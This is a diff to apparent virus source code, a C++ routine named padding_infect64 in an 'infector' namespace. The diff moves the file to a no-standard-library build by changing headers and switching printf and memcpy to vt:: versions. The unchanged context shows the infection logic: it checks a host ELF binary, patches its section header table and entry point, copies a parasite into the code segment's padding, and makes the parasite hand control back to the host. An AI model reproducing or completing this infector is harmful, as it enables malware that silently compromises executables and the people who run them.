@@ -1,13 +1,13 @@
 #include "infector/padding_infect.hh"
 
 // elf structure
-#include <linux/elf.h>
-#include <linux/limits.h>
+#include <elf.h>
 #include "common/file_descriptor.hh"
 // patch arch specific jump code
 #include "common/patch_pattern.hh"
 #include "common/patch_relinguish_control.hh"
-#include "std/string.hh"
+#include "nostdlib/stdio.hh"
+#include "nostdlib/string.hh"
 
 namespace vt::infector {
 namespace {
@@ -178,7 +178,7 @@ bool padding_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                       vt::common::Mmap<PROT_READ> parasite_mapping) {
   const Elf64_Ehdr* ehdr =
       reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
-  if (ehdr->e_type != ET_EXEC && ehdr->e_type != ET_DYN ||
+  if ((ehdr->e_type != ET_EXEC && ehdr->e_type != ET_DYN) ||
       ehdr->e_ident[EI_CLASS] != ELFCLASS64) {
     return false;
   }
@@ -186,12 +186,12 @@ bool padding_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
   ElfPaddingInfo info{};
   // Get padding size in host.
   if (!get_info(host_mapping.base(), parasite_mapping.size(), info)) {
-    printf("Cannot correctly parse host elf\n");
+    vt::printf("Cannot correctly parse host elf\n");
     return false;
   }
 
   if (info.padding_size < parasite_mapping.size()) {
-    printf(
+    vt::printf(
         "Host cannot accomodate parasite padding size: %d parasite size:%d\n",
         info.padding_size, parasite_mapping.size());
     return false;
@@ -204,7 +204,7 @@ bool padding_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
   // Patch section header table to increase text section size.
   if (!patch_sht(host_mapping, info.parasite_size_and_padding,
                  info.code_segment_last_byte_offset)) {
-    printf("Failed to patch section header table\n");
+    vt::printf("Failed to patch section header table\n");
     return false;
   }
 
@@ -212,8 +212,8 @@ bool padding_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
   auto original_entry_point = patch_ehdr(host_mapping, info);
 
   // Inject parasite.
-  memcpy(host_mapping.mutable_base() + info.parasite_file_offset,
-         parasite_mapping.base(), parasite_mapping.size());
+  vt::memcpy(host_mapping.mutable_base() + info.parasite_file_offset,
+             parasite_mapping.base(), parasite_mapping.size());
 
   // Patch parasite to resume host code after execution.
   return patch_parasite_and_resume_control(
